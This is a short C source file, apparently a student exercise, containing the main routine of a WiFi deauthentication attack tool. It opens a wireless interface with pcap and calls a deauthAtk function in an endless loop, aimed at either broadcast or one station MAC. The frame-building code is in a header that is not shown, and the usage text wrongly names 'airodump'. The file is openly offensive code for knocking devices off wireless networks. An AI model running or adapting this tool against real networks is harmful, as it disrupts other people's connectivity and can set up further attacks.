#include "deauth-attack.h"

extern bool MODE;
extern uint8_t *SRC_MAC;
extern uint8_t *DST_MAC;

void usage(){
    puts("syntax : airodump <interface>");
    puts("sample : airodump wlan0");
}

int main(int argc, const char* argv[]) {

    pcap_t *pcap;
    char errbuf[PCAP_ERRBUF_SIZE];
    const char *iface;
    const u_char *packet;
    struct pcap_pkthdr* header;
    const uint8_t *data;

	if (argc == 3) {
        MODE = BROADCAST;
	} else if (argc == 4) {
        MODE = UNICAST;
    } else {
		usage();
		return -1;
    }
	iface = argv[1];
    SRC_MAC = translateMac(argv[2]);
    if(MODE == BROADCAST)   DST_MAC = (uint8_t*)BRD_MAC;
    else                    DST_MAC = translateMac(argv[3]);

	pcap = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
		return -1;
	}

    while(true) {
        deauthAtk(pcap);
    }
	pcap_close(pcap);
}